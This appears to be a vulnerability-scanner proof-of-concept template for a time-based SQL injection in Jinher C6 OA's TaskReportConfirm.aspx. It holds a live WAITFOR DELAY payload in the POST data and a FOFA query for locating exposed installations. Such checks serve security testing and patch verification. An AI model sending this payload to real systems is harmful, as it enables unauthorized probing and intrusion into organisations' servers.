id: poc-yaml-jinher-taskreportconfirm-aspx-sqli
info:
  name: 金和C6 TaskReportConfirm.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(4,9)
  t2: t1 + 2
requests:
- method: GET
  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
  expression: status_code == 200 && contains(body,"JHSoft")
- method: POST
  path: /c6/Jhsoft.Web.dailytaskmanage/TaskReportConfirm.aspx/
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: id=3'WAITFOR DELAY'0:0:{{.t1}}'--
  expression: 'status_code == 200 &&

    contains(gbk_decode(body),"汇报确认") &&

    contains(gbk_decode(body),"同时通知任务查看人") &&

    duration > t1 &&

    duration < t2

    '
transport: http
